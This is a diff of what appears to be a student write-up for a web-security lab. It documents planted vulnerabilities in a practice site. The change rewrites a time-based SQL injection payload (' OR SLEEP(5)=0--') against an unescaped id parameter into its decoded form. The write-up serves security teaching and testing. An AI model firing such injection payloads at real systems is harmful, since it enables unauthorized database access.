@@ -18,7 +18,7 @@ Each version of the site has been given two of the six vulnerabilities. (In othe
 
 Vulnerability #1: SQL Injection (SQLi)
 
-You can inject the userid lookup (not escaped) with https://35.184.84.47/blue/public/salesperson.php?id=%27%20OR%20SLEEP(5)=0--%27
+You can inject the userid lookup (not escaped) with https://35.184.84.47/blue/public/salesperson.php?id=' OR SLEEP(5)=0--'
 
 Vulnerability #2: __________________
 
